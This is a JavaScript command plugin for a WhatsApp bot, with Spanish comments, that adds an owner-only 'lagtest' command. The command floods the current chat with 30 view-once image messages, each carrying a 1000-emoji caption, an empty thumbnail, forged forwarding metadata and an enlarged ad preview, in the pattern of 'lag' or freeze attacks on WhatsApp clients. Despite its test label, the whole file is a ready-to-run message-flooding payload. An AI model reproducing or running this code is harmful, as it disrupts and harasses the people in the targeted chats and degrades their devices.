let handler = async (m, { conn, args, usedPrefix, command }) => {
  const target = m.chat;
  const times = 30; // Número de mensajes que manda

  m.reply(`🚀 *Iniciando Lag Test en ${target}...*`);

  for (let i = 0; i < times; i++) {
    await conn.relayMessage(target, {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: '🧨'.repeat(1000),
            jpegThumbnail: Buffer.alloc(0), // Imagen vacía (sin peso real)
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              mentionedJid: ["0@s.whatsapp.net"],
              externalAdReply: {
                title: "WhatsApp Lag Test",
                body: "Cargando contenido...",
                thumbnailUrl: "https://telegra.ph/file/94cf0cb2054ff45e3f0df.jpg",
                sourceUrl: "https://whatsapp.com",
                mediaType: 1,
                renderLargerThumbnail: true,
              }
            }
          }
        }
      }
    }, { messageId: null });

    await new Promise(res => setTimeout(res, 200)); // Delay entre envíos
  }

  m.reply("✅ *Lag Test Finalizado.* Observa si hubo congelamientos o delay.");
};

handler.command = /^lagtest$/i;
handler.owner = true; // solo para el owner
export default handler;
